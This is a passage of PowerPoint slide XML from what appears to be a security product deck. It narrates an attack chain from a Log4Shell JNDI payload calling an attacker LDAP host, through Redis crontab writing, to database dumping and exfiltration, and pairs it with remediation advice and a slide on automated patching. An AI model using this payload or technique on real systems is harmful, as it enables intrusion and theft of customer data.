          <p:cNvPr id="32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10442448" y="2029968"/>
            <a:ext cx="1463040" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>LOW</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="TextBox 32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10442448" y="2286000"/>
            <a:ext cx="1463040" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Steps to DA</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="TextBox 33"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10442448" y="2487168"/>
            <a:ext cx="1463040" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>4</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="TextBox 34"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10442448" y="2743200"/>
            <a:ext cx="1463040" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Assets at risk</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="TextBox 35"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10442448" y="2944368"/>
            <a:ext cx="1463040" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>6 / 10</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="TextBox 36"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10442448" y="3200400"/>
            <a:ext cx="1463040" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Time estimate</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="TextBox 37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10442448" y="3401568"/>
            <a:ext cx="1463040" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&lt; 30 min</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="TextBox 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10442448" y="3657600"/>
            <a:ext cx="1463040" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Data at risk</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="TextBox 39"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10442448" y="3858768"/>
            <a:ext cx="1463040" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ALL PII</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="Rectangle 40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="438912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4425696"/>
            <a:ext cx="11731752" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  Attack Path Narrative — Full Compromise Chain</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="TextBox 42"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4663440"/>
            <a:ext cx="1828800" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>STEP 1 — Initial Access:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="TextBox 43"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2084831" y="4663440"/>
            <a:ext cx="9784080" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Internet attacker sends Log4Shell payload (${jndi:ldap://attacker/exploit}) to ERPNext login form. Log4j 2.14.1 resolves the JNDI URL, connects to attacker's LDAP server, and executes the response class — opening a reverse shell in 2.1 seconds. CVSS 10.0. CISA KEV. EPSS 97.5%.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="45" name="TextBox 44"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4919472"/>
            <a:ext cx="1828800" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>STEP 2 — Lateral Movement:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46" name="TextBox 45"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2084831" y="4919472"/>
            <a:ext cx="9784080" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>From the ERPNext shell, attacker discovers Redis on 172.20.0.15:9379. No password required. CONFIG SET dir /var/spool/cron + SET/BGSAVE writes a crontab. Redis user has network access to PostgreSQL.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47" name="TextBox 46"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="5175504"/>
            <a:ext cx="1828800" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>STEP 3 — Data Exfiltration:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="TextBox 47"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2084831" y="5175504"/>
            <a:ext cx="9784080" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PostgreSQL priv-esc gives superuser. Full pg_dump of shipments database (customer PII, coordinates). Kafka subscribe reads all 6 topics without auth — driver locations and customer data streamed live to C2.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49" name="TextBox 48"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="5431536"/>
            <a:ext cx="1828800" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>BREAK THE CHAIN:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50" name="TextBox 49"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2084831" y="5431536"/>
            <a:ext cx="9784080" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Patch CVE-2021-44228 (Log4Shell) immediately. This single fix eliminates Step 1 and collapses the entire 4-step chain. Additionally: add Redis requirepass, segment ERPNext ↔ Redis, enable Kafka SASL.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51" name="Rectangle 50"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="5760720"/>
            <a:ext cx="11731752" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="051218"/>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5760" y="5852160"/>
            <a:ext cx="11457432" cy="338328"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MITRE ATT&amp;CK Coverage mapped by this graph: TA0001 Initial Access (T1190 Exploit Public-Facing App) · TA0008 Lateral Movement (T1021 Remote Services) · TA0006 Credential Access (T1552 Unsecured Creds) · TA0009 Collection (T1213 Data from Info Repositories) · TA0010 Exfiltration (T1041 Exfil over C2 Channel). The graph is rebuilt automatically whenever a CVE is patched or a new asset is added to the inventory.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Patch Automation</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AI-generated code fixes · GitHub PR creation · CI/CD gate · exploit re-simulation · auto-merge</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Patch Automation closes the entire remediation loop without requiring manual developer intervention. Once the Exploit Lab confirms a CVE is exploitable, the AI engine analyses the affected component, generates the smallest possible code change to eliminate the vulnerability (upgrading a dependency, changing a configuration value, adding input validation), opens a GitHub Pull Request with a detailed description of what changed and why, waits for the CI/CD pipeline to pass all tests, and then — crucially — re-runs the original exploit simulation against the patched build. Only if the exploit now returns BLOCKED is the PR approved for auto-merge. This means no patch can be merged that does not actually fix the vulnerability it claims to address. Every action is logged with a full audit trail.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="2121408"/>
            <a:ext cx="2286000" cy="777240"/>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21408"/>
            <a:ext cx="228600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12848"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Auto-Created PRs</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="TextBox 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338328" y="2395728"/>
            <a:ext cx="2066544" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>4</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="TextBox 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338328" y="2679192"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>AI-authored patches</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2606040" y="2121408"/>
            <a:ext cx="2286000" cy="77724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6040" y="2121408"/>
            <a:ext cx="228600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212848"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Merged</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="TextBox 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2715768" y="2395728"/>
            <a:ext cx="2066544" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2715768" y="2679192"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CI + re-sim verified</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4983480" y="2121408"/>
            <a:ext cx="2286000" cy="77724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2121408"/>
            <a:ext cx="228600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3208" y="2212848"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CI Passed</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="TextBox 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5093208" y="2395728"/>
            <a:ext cx="2066544" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="TextBox 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5093208" y="2679192"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Tests green</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Rectangle 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7360920" y="2121408"/>
            <a:ext cx="2286000" cy="777240"/>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2121408"/>
            <a:ext cx="228600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2212848"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Re-sim BLOCKED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="TextBox 26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7470648" y="2395728"/>
            <a:ext cx="2066544" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="TextBox 27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7470648" y="2679192"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Exploit now defeated</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Rectangle 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9738360" y="2121408"/>
            <a:ext cx="2194560" cy="777240"/>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38360" y="2121408"/>
            <a:ext cx="219456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8088" y="2212848"/>
            <a:ext cx="1975104" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Awaiting Review</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9848088" y="2395728"/>
            <a:ext cx="1975104" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
